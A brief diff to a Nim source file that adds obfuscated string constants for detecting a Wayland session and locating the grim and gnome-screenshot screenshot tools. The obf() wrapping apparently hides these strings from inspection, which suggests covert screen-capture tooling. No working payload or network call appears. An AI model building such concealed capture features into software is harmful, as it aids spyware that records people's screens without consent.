@@ -44,5 +44,9 @@ const
   scClkTck* = 2
   scNProcessorsOnln* = 84
   displayEnvKey* = obf("DISPLAY")
+  sessionTypeEnvKey* = obf("XDG_SESSION_TYPE")
+  sessionTypeWayland* = obf("wayland")
+  grimBinPaths* = [obf("/usr/bin/grim"), obf("/bin/grim")]
+  gnomeScreenshotBin* = obf("/usr/bin/gnome-screenshot")
   xLibSo6* = obf("libX11.so.6")
   xLibSo* = obf("libX11.so")
